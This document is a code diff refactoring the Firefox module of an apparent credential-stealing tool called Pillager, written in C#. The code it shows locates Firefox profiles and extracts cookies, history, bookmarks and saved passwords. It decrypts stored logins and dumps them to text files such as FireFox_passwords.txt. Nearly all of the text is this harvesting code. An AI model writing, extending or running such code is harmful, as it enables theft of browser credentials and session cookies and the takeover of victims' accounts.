@@ -7,16 +7,14 @@ using System.Text.RegularExpressions;
 
 namespace Pillager.Browsers
 {
-    internal static class FireFox
+    internal class FireFox: ICommand
     {
-        public static string BrowserName = "FireFox";
-
-        public static string BrowserPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
+        public string BrowserPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                 "Mozilla\\Firefox\\Profiles");
 
-        public static string masterPassword = "";
+        public string masterPassword = "";
 
-        public static string FireFox_cookies()
+        public string FireFox_cookies()
         {
             StringBuilder cookies = new StringBuilder();
             foreach (var directory in Directory.GetDirectories(BrowserPath))
@@ -47,7 +45,7 @@ namespace Pillager.Browsers
             return cookies.ToString();
         }
 
-        public static string FireFox_history()
+        public string FireFox_history()
         {
             StringBuilder history = new StringBuilder();
             foreach (var directory in Directory.GetDirectories(BrowserPath))
@@ -75,7 +73,7 @@ namespace Pillager.Browsers
             return history.ToString();
         }
 
-        public static string FireFox_books()
+        public string FireFox_books()
         {
             StringBuilder books = new StringBuilder();
             foreach (var directory in Directory.GetDirectories(BrowserPath))
@@ -117,7 +115,7 @@ namespace Pillager.Browsers
             return books.ToString();
         }
 
-        public static string FireFox_passwords()
+        public string FireFox_passwords()
         {
             StringBuilder password = new StringBuilder();
             foreach (var directory in Directory.GetDirectories(BrowserPath))
@@ -200,7 +198,7 @@ namespace Pillager.Browsers
             return password.ToString();
         }
 
-        public static string decryptLogins(string loginsJsonPath, byte[] privateKey)
+        public string decryptLogins(string loginsJsonPath, byte[] privateKey)
         {
             StringBuilder sb = new StringBuilder();
             Asn1Der asn = new Asn1Der();
@@ -219,7 +217,7 @@ namespace Pillager.Browsers
             return sb.ToString();
         }
 
-        public static Login[] ParseLoginFile(string path)
+        public Login[] ParseLoginFile(string path)
         {
             string rawText = File.ReadAllText(path);
             int openBracketIndex = rawText.IndexOf('[');
@@ -228,7 +226,7 @@ namespace Pillager.Browsers
             return ParseLoginItems(loginArrayText);
         }
 
-        public static Login[] ParseLoginItems(string loginJSON)
+        public Login[] ParseLoginItems(string loginJSON)
         {
             int openBracketIndex = loginJSON.IndexOf('{');
             List<Login> logins = new List<Login>();
@@ -273,21 +271,21 @@ namespace Pillager.Browsers
             }
             return logins.ToArray();
         }
-        public static void Save(string path)
+        public override void Save(string path)
         {
             try
             {
                 if (!Directory.Exists(BrowserPath)) return;
-                string savepath = Path.Combine(path, BrowserName);
+                string savepath = Path.Combine(path, "FireFox");
                 Directory.CreateDirectory(savepath);
                 string cookies = FireFox_cookies();
                 string history = FireFox_history();
                 string books = FireFox_books();
                 string passwords = FireFox_passwords();
-                if (!String.IsNullOrEmpty(cookies)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_cookies.txt"), cookies);
-                if (!String.IsNullOrEmpty(history)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_history.txt"), history);
-                if (!String.IsNullOrEmpty(books)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_books.txt"), books);
-                if (!String.IsNullOrEmpty(passwords)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_passwords.txt"), passwords);
+                if (!String.IsNullOrEmpty(cookies)) File.WriteAllText(Path.Combine(savepath, "FireFox_cookies.txt"), cookies, Encoding.UTF8);
+                if (!String.IsNullOrEmpty(history)) File.WriteAllText(Path.Combine(savepath, "FireFox_history.txt"), history, Encoding.UTF8);
+                if (!String.IsNullOrEmpty(books)) File.WriteAllText(Path.Combine(savepath, "FireFox_books.txt"), books, Encoding.UTF8);
+                if (!String.IsNullOrEmpty(passwords)) File.WriteAllText(Path.Combine(savepath, "FireFox_passwords.txt"), passwords, Encoding.UTF8);
                 foreach (var directory in Directory.GetDirectories(BrowserPath))
                 {
                     if (File.Exists(Path.Combine(directory, "storage-sync-v2.sqlite")))
